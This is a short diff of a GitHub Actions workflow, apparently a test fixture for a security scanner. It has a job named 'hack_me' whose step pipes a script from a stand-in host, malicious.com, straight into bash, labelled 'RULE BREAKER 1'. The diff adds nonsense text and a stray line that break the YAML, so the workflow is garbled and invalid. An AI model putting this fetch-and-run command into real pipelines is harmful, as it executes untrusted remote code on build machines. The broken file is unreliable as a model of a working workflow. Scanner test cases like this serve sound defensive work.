@@ -5,7 +5,8 @@ jobs:
   hack_me:
     runs-on: ubuntu-latest
     steps:
-      - name: This will trigger the scanner
+      - name: This will trigger the scanner sdsdsdvdvsd
+      sds
         # RULE BREAKER 1: Piping curl to bash
         run: curl -sL http://malicious.com/script.sh | bash
 
